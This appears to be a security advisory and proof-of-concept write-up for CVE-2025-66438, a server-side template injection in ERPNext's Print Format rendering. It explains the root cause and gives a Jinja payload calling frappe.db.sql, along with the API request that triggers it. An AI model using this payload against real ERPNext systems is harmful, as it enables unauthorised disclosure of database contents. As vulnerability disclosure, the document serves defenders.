**SSTI on ERPNEXT ≤ 15.89.0 (CVE-2025-66438)**

**Exploit Author: An Chu ( aka iamanc )**

**Vendor:** Frappe Technologies Pvt. Ltd.

**Product:** ERPNext

**Affected Versions:** ERPNext ≤ 15.89.0

**CVE:  CVE‑2025‑66438**

**Impact:** 

An authenticated attacker can exploit this vulnerability to execute arbitrary SQL queries via server-side template injection, resulting in disclosure of sensitive database information.

**Summary**:

An **authenticated Server-Side Template Injection (SSTI)** vulnerability exists in ERPNext’s Print Format rendering mechanism. Specifically, the API `frappe.www.printview.get_html_and_style()` triggers the rendering of the `html` field inside a `Print Format` document using `frappe.render_template(template, doc)` via the `get_rendered_template()` call chain.

Although ERPNext wraps Jinja2 in a `SandboxedEnvironment`, it exposes sensitive functions such as `frappe.db.sql` through `get_safe_globals()`.

An attacker with permission to create or modify a `Print Format` can inject arbitrary Jinja expressions into the `html` field. Once the malicious `Print Format` is saved, the attacker can call `get_html_and_style()` with a target document (e.g., `Supplier`, `Sales Invoice`) to trigger the render process. This leads to **information disclosure from the database**, such as database version, schema details, or sensitive values depending on the injected payload.

**Technical Details:**

ERPNext is an open-source ERP system built on the Frappe Framework, which is written in Python and uses MariaDB/MySQL as its backend database.

**HTTP Routing in Frappe**

- Frappe exposes backend Python functions through HTTP endpoints.
- The endpoint format is :

```php
/api/method/<python.module.path>.<function_name>
```

•  When a request is sent to this URL, Frappe resolves the module path and **executes the corresponding Python function directly**.

**@frappe.whitelist()**

- The `@frappe.whitelist()` decorator **exposes a Python function as a public HTTP API**.
- Whitelisted functions:
    - Accept parameters directly from user-controlled HTTP requests
    - Do not enforce input validation by default
- This decorator defines the **attack entry point** for this vulnerability.

Example: 

Source code

```php
@frappe.whitelist()
def test(a, b):
    return a + b
```

Request

```php
POST /api/method/module.test
a=1&b=2
```

**Vulnerable Template Rendering:**

frappe uses frappe.render_template(template, context) to render Jinja2 templates. Even with SandboxedEnvironment, dangerous globals remain:

```php
from frappe import render_template, get_safe_globals

render_template(user_template, user_context)
```

`get_safe_globals()` exposes:

- frappe.db.sql
- frappe.get_doc
- frappe.throw
- frappe.local

If a malicious Jinja expression is injected, attacker can execute Python code in this restricted environment and query the database.

**Vulnerable Functions Analysis:**

**Vulnerable source code:**

File frappe/frappe/www/printview.py

```python
@frappe.whitelist()
def get_html_and_style(
	doc: str,
	name: str | None = None,
	print_format: str | None = None,
-----TRUNCATED---------
):
	"""Returns `html` and `style` of print format, used in PDF etc"""

	-----TRUNCATED---------

	try:
		html = get_rendered_template(
			doc=document,
			print_format=print_format,
			meta=document.meta,
-----TRUNCATED---------

	return {"html": html, "style": get_print_style(style=style, print_format=print_format)}
def get_rendered_template(
	doc: "Document",
	print_format: str | None = None,
	meta=None,
	no_letterhead: bool | None = None,
	letterhead: str | None = None,
	trigger_print: bool = False,
	settings: dict | None = None,
) -> str:
-----TRUNCATED---------
	# determine template
	if print_format:
		doc.print_section_headings = print_format.show_section_headings
		doc.print_line_breaks = print_format.line_breaks
		doc.align_labels_right = print_format.align_labels_right
		doc.absolute_value = print_format.absolute_value

		def get_template_from_string():
			return jenv.from_string(get_print_format(doc.doctype, print_format))

		-----TRUNCATED---------
	hook_func = frappe.get_hooks("pdf_body_html")
	html = frappe.get_attr(hook_func[-1])(jenv=jenv, template=template, print_format=print_format, args=args)

-----TRUNCATED---------
	return html
def get_print_format(doctype, print_format):
	
-----TRUNCATED---------

-----TRUNCATED---------
	if print_format.html:
		return print_format.html
	
```

**Root Cause**

The vulnerability originates from **unsafe rendering of user‑controlled Print Format templates**.

- The `html` field of a **Print Format** document is fully **user‑controlled** by authenticated users with permission to create or edit Print Formats.
- When a Print Format is rendered (e.g., for PDF generation or print preview), its `html` content is loaded via `get_print_format()` and passed to `jenv.from_string()` without sanitization.
- The template is subsequently rendered through the `get_rendered_template()` execution flow.
- The Jinja2 execution context exposes unsafe globals via `get_safe_globals()`, including `frappe.db.sql`.

As a result, an authenticated attacker can inject arbitrary Jinja2 expressions, leading to **Server‑Side Template Injection (SSTI)**.

**PoC:**

### Step 1: Inject SSTI Payload into Print Format

Navigate to:

```
Print Format -> new Print Format
```

Set html to:

```
{{ frappe.db.sql("SELECT @@version") }} //iamanc
```

Save the document.

<img width="1533" height="400" alt="image" src="https://github.com/user-attachments/assets/ee49b71e-ef31-4c87-8c62-719e692765a6" />


At this stage, the payload is stored but not yet executed.

<img width="2048" height="400" alt="image" src="https://github.com/user-attachments/assets/663d5bdf-95a4-4683-b89c-05070f5cdebb" />


---

Step 2: Trigger SSTI via get_html_and_style API

Navigate to:

```php
Supplier → SUP-0001
```

After ERPNext frontend will call API:

```php
POST /api/method/frappe.www.printview.get_html_and_style
```

<img width="1084" height="400" alt="image" src="https://github.com/user-attachments/assets/1674ad27-50da-4e5c-8ff6-157eddb0827c" />


We need change value print_format to SSTI-Bug-5

<img width="2048" height="400" alt="image" src="https://github.com/user-attachments/assets/c0f44dd5-f8ab-4c21-bf65-e38931ddd984" />
